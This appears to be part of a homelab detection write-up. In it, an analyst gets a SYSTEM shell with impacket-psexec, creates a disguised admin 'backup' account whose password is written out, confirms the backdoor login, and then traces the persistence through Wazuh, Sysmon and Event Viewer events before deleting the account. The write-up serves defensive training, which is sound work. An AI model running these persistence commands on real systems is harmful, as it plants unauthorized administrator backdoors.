# 05 — Investigation (triage steps, actual)

1. **Foothold confirmed:** `impacket-psexec v0.14.0` (adminlab) → SYSTEM shell; uploaded `DmmYUPVU.exe`, service `Wlug`. 📸 `evidence/1-kali-psexec-shell.png`
2. **Account created:** `net user svc_backup "B@ckupSvc2026!" /add /fullname:"Backup Service Account" /comment:"Service account for automated backup" /expires:never` → success. 📸 `evidence/02-kali-net-user-add.png`
3. **Added to Administrators:** `net localgroup Administrators svc_backup /add` → success. 📸 `evidence/03-kali-add-to-administrators.png`
4. **Verified on host:** `net user svc_backup` → active Yes, expires Never, Local Group Memberships `*Administrators *Users`, Last logon Never. 📸 `evidence/04-kali-verify-account.png`
5. **Backdoor proven:** `netexec smb -u svc_backup -p 'B@ckupSvc2026!'` → `(Pwn3d!)`. 📸 `evidence/05-kali-backdoor-login-test.png`
6. **4720 found in Wazuh:** `data.win.system.eventID:4720` → target `svc_backup`, SID `-1011`, subject `DESKTOP-F0JVTQT$` (SYSTEM). 📸 `evidence/07-wazuh-4720-account-created.png`
7. **4732 found:** `data.win.system.eventID:4732` → member SID `-1011` (correlates to svc_backup) added to `Administrators` (S-1-5-32-544), systemTime 2026-10-31T15:53:39.245Z, eventRecordID 4390. 📸 `evidence/08-wazuh-4732-added-to-admins.png`
8. **Sysmon 1 found:** two `net.exe` (32-bit) process creations with full command lines + hashes; the `net localgroup` event tagged **T1098.007**. 📸 `evidence/10-wazuh-sysmon-1-net-exe.png`
9. **Corroborated on host:** Event Viewer Security log → 4720 (10/30 7:52:15 AM) + 4732 (10/31 8:53:39 AM); 4732 member = `DESKTOP-F0JVTQT\svc_backup`. 32 total 4720/4732 events (includes earlier test accounts — filter by SID -1011). 📸 `evidence/12-windows-eventviewer-4720-4732.png`
10. **Containment:** `net user svc_backup /delete`; rotated adminlab; audited for other unknown local admins.

## Evidence folder (9 screenshots — exact filenames)

| Filename | Content |
|---|---|
| `1-kali-psexec-shell.png` | impacket-psexec SYSTEM shell (`DmmYUPVU.exe`, service `Wlug`) |
| `02-kali-net-user-add.png` | `net user svc_backup ... /add` success |
| `03-kali-add-to-administrators.png` | `net localgroup Administrators svc_backup /add` success |
| `04-kali-verify-account.png` | `net user svc_backup` + `net localgroup Administrators` verification |
| `05-kali-backdoor-login-test.png` | `netexec` as svc_backup → `(Pwn3d!)` |
| `07-wazuh-4720-account-created.png` | Wazuh 4720 JSON (svc_backup, SID -1011, subject SYSTEM) |
| `08-wazuh-4732-added-to-admins.png` | Wazuh 4732 JSON (member -1011 → Administrators S-1-5-32-544) |
| `10-wazuh-sysmon-1-net-exe.png` | Wazuh Sysmon 1 — two net.exe events (command lines + hashes + T1098.007 tag) |
| `12-windows-eventviewer-4720-4732.png` | Event Viewer Security log 4720/4732, 4732 details |

## Analyst note

The **subject in both 4720 and 4732 is the machine account `DESKTOP-F0JVTQT$` (SYSTEM, S-1-5-18)** — not a human admin. Legitimate account creation is done by an admin user (subject = that user's SID); creation by SYSTEM/machine context indicates tooling (psexec, RMM, or malware). This is the highest-fidelity indicator in the case. The member SID in 4732 (`-1011`) exactly matches the target SID in 4720 — that correlation proves the same backdoor account was created and then promoted to admin.
